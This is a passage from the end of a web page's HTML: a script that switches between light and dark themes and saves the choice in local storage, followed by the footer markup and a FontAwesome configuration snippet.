    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
